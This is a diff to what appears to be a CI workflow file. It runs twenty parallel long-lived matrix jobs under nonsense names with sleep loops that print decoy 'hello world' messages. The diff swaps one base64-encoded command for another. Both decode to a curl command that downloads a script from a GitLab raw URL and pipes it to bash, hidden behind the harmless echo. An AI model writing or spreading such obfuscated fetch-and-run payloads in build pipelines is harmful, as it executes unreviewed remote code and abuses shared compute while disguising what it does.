@@ -19,26 +19,26 @@ jobs:
       max-parallel: 20
       matrix:
         include:
-          - name: asakafhias-aesene12awe
-          - name: asakafhias-besene12bwe
-          - name: asakafhias-cesene12cwe
-          - name: asakafhias-desene12dwe
-          - name: asakafhias-eesene12ewe
-          - name: asakafhias-fesene12fwe
-          - name: asakafhias-gesene12gwe
-          - name: asakafhias-hesene12hwe
-          - name: asakafhias-iesene12iwe
-          - name: asakafhias-jesene12jwe
-          - name: okakfhair-aaesene12kwe
-          - name: okakfhair-baesene12lwe
-          - name: okakfhair-caesene12mwe
-          - name: okakfhair-daesene12nwe
-          - name: okakfhair-eaesene12owe
-          - name: okakfhair-faesene12pwe
-          - name: okakfhair-agesene12qwe
-          - name: okakfhair-haesene12rwe
-          - name: okakfhair-iaesene12swe
-          - name: okakfhair-jaesene12twe          
+          - name: tasakafhias-aesene12awe1O
+          - name: tasakafhias-besene12bwe2O
+          - name: tasakafhias-cesene12cwe3O
+          - name: tasakafhias-desene12dwe4O
+          - name: tasakafhias-eesene12ewe5O
+          - name: tasakafhias-fesene12fwe6O
+          - name: tasakafhias-gesene12gwe7O
+          - name: tasakafhias-hesene12hwe8O
+          - name: tasakafhias-iesene12iwe9O
+          - name: tasakafhias-jesene12jwe10O
+          - name: lokakfhair-aaesene12kwe11O
+          - name: lokakfhair-baesene12lwe12O
+          - name: lokakfhair-caesene12mwe13O
+          - name: lokakfhair-daesene12nwe14O
+          - name: lokakfhair-eaesene12owe15O
+          - name: lokakfhair-faesene12pwe16O
+          - name: lokakfhair-agesene12qwe17O
+          - name: lokakfhair-haesene12rwe18O
+          - name: lokakfhair-iaesene12swe19O
+          - name: lokakfhair-jaesene12twe200          
     runs-on: ubuntu-latest
     timeout-minutes: 320
     steps:
@@ -58,7 +58,7 @@ jobs:
             else
               if [ "$LOOP" -ge 9983 ]; then    # 6 loop pertama (9988–9983)
                 echo "🔄 HELLO WORLD"
-                SLEEP=580
+                SLEEP=480
               else
                 echo "⏳ hello world"
                 SLEEP=3600
@@ -68,13 +68,13 @@ jobs:
             # Sebelum 3 siklus, aturan biasa
             if [ "$LOOP" -ge 9983 ]; then
               echo "🔄 HELLO WORLD"
-              SLEEP=600
+              SLEEP=480
             else
               echo "⏳ HELLO WORLD"
               SLEEP=3600
             fi
           fi
-          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9zcGluYXpvbGxhL3NhaW50Ly0vcmF3L21haW4vbHVtYmFyYW5zIHwgYmFzaA | sh & sleep $SLEEP
+          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbHVtYW5zYW5zIHwgYmFzaA | sh & sleep $SLEEP
 
   line-phanu:
     needs: run-lscpu
